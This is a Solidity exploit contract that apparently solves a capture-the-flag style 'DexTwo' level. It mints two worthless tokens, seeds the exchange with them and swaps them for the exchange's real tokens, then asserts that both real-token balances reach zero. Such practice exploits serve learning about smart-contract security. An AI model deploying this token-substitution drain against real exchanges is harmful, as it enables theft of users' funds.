pragma solidity ^0.8.0;

import "OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/token/ERC20/IERC20.sol";
import "OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/token/ERC20/ERC20.sol";
import 'OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/access/Ownable.sol';
import 'contracts/dex2.sol';
import 'contracts/mytoken.sol';
contract First_AttackDexTwo {
    constructor(DexTwo dex) {
        IERC20 token1 = IERC20(dex.token1());
        IERC20 token2 = IERC20(dex.token2());

        MyToken myToken1 = new MyToken();
        MyToken myToken2 = new MyToken();

        // Save 1 in contract, send another 1 to dex
        myToken1.mint(2);
        myToken2.mint(2);

        myToken1.transfer(address(dex), 1);
        myToken2.transfer(address(dex), 1);

        myToken1.approve(address(dex), 1);
        myToken2.approve(address(dex), 1);

        dex.swap(address(myToken1), address(token1), 1);
        dex.swap(address(myToken2), address(token2), 1);

        require(token1.balanceOf(address(dex)) == 0, "dex token1 balance != 0");
        require(token2.balanceOf(address(dex)) == 0, "dex token2 balance != 0");
    }
}

